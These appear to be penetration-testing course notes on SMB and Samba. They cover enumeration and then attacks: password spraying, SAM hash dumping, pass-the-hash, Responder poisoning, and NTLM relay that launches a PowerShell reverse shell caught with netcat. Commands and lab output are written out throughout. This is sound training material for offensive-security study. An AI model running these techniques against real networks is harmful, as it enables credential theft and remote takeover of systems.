## SMB

| Aspect | Details |
|--------|---------|
| **Protocol Type** | Client-server protocol for file/directory access and network resources (printers, routers) |
| **Primary Platform** | Windows operating systems with backward compatibility; Linux/Unix via Samba |
| **Transport** | TCP protocol with three-way handshake for connection establishment |
| **File Sharing** | Server shares arbitrary portions of local file system; hierarchy independent of server structure |
| **Access Control** | Access Control Lists (ACLs) with granular permissions (execute, read, full access) for users/groups |
| **Cross-Platform** | Samba enables SMB use on Linux/Unix for cross-platform communication |
| **Network Communication** | Enables client access to shared files/services; requires SMB server application on target system |

## SAMBA

| Component | Description |
|-----------|-------------|
| **Samba** | Unix-based SMB server implementing CIFS (SMB v1 dialect) for Windows compatibility |
| **Protocols & Ports** | **NetBIOS**: TCP 137,138,139<br>**CIFS**: TCP 445 only<br>**Modern**: SMB 2/3 preferred |
| **Active Directory** | Version 3: Domain member capability<br>Version 4: Domain controller functionality |
| **Daemons** | **smbd**: SMB server functions<br>**nmbd**: NetBIOS message block functions |
| **Network Structure** | **Workgroup**: Named collection of computers/resources on SMB network |
| **NetBIOS** | IBM API for computer networking; requires name registration via hostname reservation or NBNS/WINS |

## Footprinting the Service

- Using **Nmap**: `sudo nmap 10.129.14.128 -sV -sC -p139,445`
- Using **rpcclient**: `rpcclient -U "" 10.129.14.128`. The rpcclient offers us many different requests with which we can execute specific functions on the SMB server to get information. Few are:

|Query	|Description|
|-|-|
|`srvinfo`	|Server information.|
|`enumdomains`	|Enumerate all domains that are deployed in the network.|
|`querydominfo`	|Provides domain, server, and user information of deployed domains.|
|`netshareenumall`	|Enumerates all available shares.|
|`netsharegetinfo <share>`	|Provides information about a specific share.|
|`enumdomusers`	|Enumerates all domain users.|
|`queryuser <RID>`|	Provides information about a specific user.|

- Using **smbclient** if `null session` allowed: `smbclient -N -L //10.129.14.128`
- Using **Impacket - Samrdump.py**: `samrdump.py 10.129.14.128`
- Using **SMBmap**: `smbmap -H 10.129.14.128`
- Using **CrackMapExec**: `crackmapexec smb 10.129.14.128 --shares -u '' -p ''`
- Using **smbclient**: `smbclient //10.129.203.6/workshare -U username --password='password-here'`
- Mount share: `sudo mount -t cifs //10.129.203.6/workshare /your-folder -o username=uname,password='password-here'`

- `Enum4linux` is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets such as:

* Workgroup/Domain name
* Users information
* Operating system information
* Groups information
* Shares Folders
* Password policy information

The original tool was written in Perl and rewritten by Mark Lowe in Python.

`$ ./enum4linux-ng.py 10.10.11.45 -A -C`

## Attacking SMB

### Brute Forcing vs. Password Spraying

**Brute Forcing:** Tests many passwords against one account, risking account lockout. Only recommended if lockout threshold is known.

**Password Spraying:** Tests one common password against multiple accounts—safer and more effective. Wait 30-60 minutes between attempts (typically 2-3 attempts are safe).

### Using CrackMapExec (CME)

CME can spray passwords across multiple IPs and users. Use `-u` for username list and `-p` for password.

**Example:**
```shell-session
[!bash!]$ cat /tmp/userlist.txt
Administrator
jrodriguez 
admin
<SNIP>
jurena
```

```shell-session
[!bash!]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
<SNIP>
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

**Notes:** 
- CME exits after first success (use `--continue-on-success` to continue)
- Use `--local-auth` for non-domain computers
- See Active Directory Enumeration & Attacks module for deeper study
- Use `netexec` if `crackmapexec` broke

### Remote Code Execution (RCE)

### PsExec Overview

**Sysinternals** (created 1996, acquired by Microsoft 2006) provides Windows administration tools. **PsExec** enables remote process execution without manual client installation.

**How PsExec Works:**
1. Deploys Windows service to remote machine's `admin$` share
2. Uses DCE/RPC over SMB to access Service Control Manager API
3. Starts PsExec service remotely
4. Creates named pipe for command execution

### Linux Alternatives

**Impacket Suite:**
- **PsExec** - Python implementation using RemComSvc
- **SMBExec** - No RemComSvc; uses local SMB server for command output (useful when no writeable share exists)
- **atexec** - Executes commands via Task Scheduler service

**Other Tools:**
- **CrackMapExec** - Includes `smbexec` and `atexec` implementations
- **Metasploit PsExec** - Ruby-based implementation

All tools provide similar remote execution capabilities with varying techniques and use cases.

### CrackMapExec for Remote Execution

### Running Commands

CrackMapExec can execute CMD or PowerShell commands on multiple hosts simultaneously.

**Syntax:**
- `-x`: CMD commands
- `-X`: PowerShell commands

### Extracting SAM Database Hashes

The **Security Account Manager (SAM)** stores user password hashes. With administrative access, you can extract these hashes for:

- Authenticating as another user
- Password cracking and credential reuse
- Pass-the-Hash attacks

### Using CrackMapExec

SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

### Pass-the-Hash (PtH)

**Pass-the-Hash** allows authentication using an NTLM hash instead of a plaintext password—useful when hashes cannot be cracked.

### Supported Tools
- Impacket suite
- SMBMap
- CrackMapExec

### Example with CrackMapExec

Use `-H` flag with the NTLM hash:

```shell-session
[!bash!]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE
```

This technique authenticates directly to SMB services without needing the plaintext password.

### Forced Authentication Attacks

### Overview
Exploit SMB by creating a fake SMB server to capture users' **NetNTLM v1/v2 hashes** using **Responder**.

### How Responder Works

**Responder** poisons LLMNR, NBT-NS, and MDNS traffic, sets up fake services (including SMB), and captures authentication hashes.

**Start Responder:**
```shell-session
[!bash!]$ responder -I <interface name>
```

### Windows Name Resolution Process

When resolving hostnames to IPs, Windows follows this order:
1. Check local hosts file (`C:\Windows\System32\Drivers\etc\hosts`)
2. Query local DNS cache
3. Query configured DNS server
4. Send multicast query to network (LLMNR/NBT-NS)

### The Attack

**Scenario:** User mistypes `\\mysharefoder\` instead of `\\mysharedfolder\`

1. Name resolution fails (non-existent share)
2. Machine sends multicast query to all network devices
3. Responder intercepts and responds, impersonating the server
4. Victim attempts authentication to fake SMB server
5. NetNTLM hash captured

**Key Vulnerability:** No integrity verification of multicast responses—attackers can spoof trusted servers and steal credentials.

### Relaying Captured Hashes

If hash cracking fails, relay captured NetNTLM hashes to another machine using **impacket-ntlmrelayx** or **Responder MultiRelay.py**.

### Setup

**1. Disable SMB in Responder:**
```shell-session
[!bash!]$ cat /etc/responder/Responder.conf | grep 'SMB ='
SMB = Off
```

**2. Run impacket-ntlmrelayx:**
```shell-session
[!bash!]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

Default action: Dumps SAM database. Use `-c` to execute commands.

**Sample Output:**
```
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Executing Commands

Use `-c` with PowerShell reverse shell (generate at revshells.com):

```shell-session
[!bash!]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64_payload>'
```

**Catch the shell:**
```shell-session
[!bash!]$ nc -lvnp 9001

connect to [10.10.110.133] from [10.10.110.146] 52471
PS C:\Windows\system32> whoami
nt authority\system
```

The relay intercepts authentication, forwards it to the target, and executes your command with the victim's privileges.
